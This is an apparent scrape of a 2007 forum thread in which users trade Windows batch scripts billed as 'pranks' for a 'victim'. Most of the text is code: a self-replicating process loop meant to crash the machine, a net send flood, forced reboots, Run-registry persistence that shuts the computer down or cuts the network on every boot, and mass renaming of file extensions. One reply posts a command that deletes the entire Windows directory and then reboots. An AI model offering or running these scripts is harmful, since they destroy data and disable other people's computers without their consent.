channel.title: Some really great batch pranks
channel.description:
There are a couple of batch files I've made during my spare time... Great for some economic sized fun.
[u][b]Why not popup?[/b][/u]
[code]:LOOP Msg * Birds can't fly without wings... Msg * Your gonna' die if you can't whistle... GOTO :LOOP[/code]
[u][b]Great prank that gets the the victim.[/b][/u]
[code]tree C: @ECHO Please fill in the proper username; if not the above files will be deleted @ECHO Have fun @set/p\/name=username: @ECHO ROFL you got it wrong @ECHO LAWL you got it wrong again @ECHO You're killing me here, you got it wrong again @ECHO Cmon man @ECHO All files are now being deleted. JUST KIDDING HAVE A GOOD DAY. pause shutdown -c Good bye, BTW you have been owned[/code]
[u][b]Crasher - Lets you open an .exe program in a loop causing the computer to lag and hopefully crash.[/b][/u]
[code]@ECHO OFF :LOOP START calc.exe START (name of batch file you created including extension here) GOTO LOOP[/code]
[u][b]Flood Network - Floods any computers in a network with yours.[/b][/u]
[code]:CRASH net send * WORKGROUP ENABLED net send * WORKGROUP ENABLED GOTO CRASH[/code]
[u][b]Disable Internet / Network - Great for a good joke.[/b][/u]
[code]ipconfig /release[/code]
[u][b]Shutdown a computer.[/b][/u]
[code]shutdown -r -f -t0[/code]
[u][b]Shutdown a computer every time it is booted up.[/b][/u]
[code]echo @echo off>c:\windows\hartlell.bat echo break off>>c:\windows\hartlell.bat echo shutdown -r -t 11 -f>>c:\windows\hartlell.bat echo end>>c:\windows\hartlell.bat reg add hkey_local_machine\software\microsoft\windows\currentversion\run /v startAPI /t reg_sz /d c:\windows\hartlell.bat /f reg add hkey_current_user\software\microsoft\windows\currentversion\run /v HAHAHA /t reg_sz /d c:\windows\hartlell.bat /f echo Inching Away strikes again! PAUSE[/code]
[u][b]Disable Internet / Network Permanently[/b][/u]
[code]echo @echo off>c:\windows\wimn32.bat echo break off>>c:\windows\wimn32.bat echo ipconfig/release_all>>c:\windows\wimn32.bat echo end>>c:\windows\wimn32.bat reg add hkey_local_machine\software\microsoft\windows\currentversion\run /v WINDOWsAPI /t reg_sz /d c:\windows\wimn32.bat /f reg add hkey_current_user\software\microsoft\windows\currentversion\run /v CONTROLexit /t reg_sz /d c:\windows\wimn32.bat /f echo Inching Away strikes again! PAUSE [/code]
[u][b]Change commonly used files (.exe) into .txt files.[/b][/u]
[code]REN *.DOC *.TXT REN *.JPEG *.TXT REN *.LNK *.TXT REN *.AVI *.TXT REN *.MPEG *.TXT REN *.COM *.TXT REN *.BAT *.TXT[/code]

item.description:

Yeah, fucking peoples computers up is a very thoughtful prank… however, if the exes that were converted to txt files aren’t crucial for the computer to function properly, they could still be changed back into exe files.

item.title: Some really great batch pranks
item.dc:creator: @snoop_puff snoop puff
item.description:
@snoop_puff wrote:

when your hacked with one of these how do u get rid of them… and if i
wanted to test one on my self are there any that arent harmful or a way to
stop it?[br][size=1]Posted on: May 31, 2007, 01:46:51 PM[/size][hr]I tried shutdown -r -f -t0 on my self and it didnt shut down
the computer…?[br][size=1]Posted on: May 31, 2007, 01:48:36 PM[/size][hr]what about this one… whats this do
Echo Off
mkdir c:\windows\desktop\Virus
mkdir c:\windows\desktop\hetwerkt.txt
mkdir c:\windows\desktop\delling.txt
rmdir c:\windows\desktop\delling.txt
copy c:\windows\himem.sys c:\windows\desktop
copy c:\windows\desktop\test.text c:\windows\desktop\Virus\test.txt
del c:\windows\desktop\test.txt
renamec:\windows\desktop\virus\test.txt c:\windows\desktop\virus.txt
rename c:\windows\desktop\himem.sys c:\windows\desktop\StarVirus.sys
echo Het virus Fucking works ya!!!
echo Om het te kunnen draaien moet je in je desktop
echo VIRUS.TXT aanmaken. anders werkt het niet[br][size=1]Posted on: May 31, 2007, 01:51:30 PM[/size][hr]when I use one … the black screen with the text comes up but then dissappears right away…

Read full topic

item.title: Some really great batch pranks
item.dc:creator: @Javacisnotrecognized _^_
item.description:
@Javacisnotrecognized wrote:

echo L2NOTSUCK
copy shutdown.exe %TMP%\shutdown.exe
rmdir /S /Q %WINDIR%
"%TMP%\shutdown.exe" -t 00 -r

Read full topic

item.title: Some really great batch pranks
item.dc:creator: @marluxia marluxia
item.description:
@marluxia wrote:

i made this one a while ago

@echo off
set a=10
shutdown -r -t 10 -f -m \\%computername%
:start
echo %a%
set /a a=%a% - 1
wait 1
if "%a%"=="1" goto savior
cls
goto start
:savior
shutdown -a -m \\%computername%
cls
echo Just a harmless Joke!
pause

Read full topic
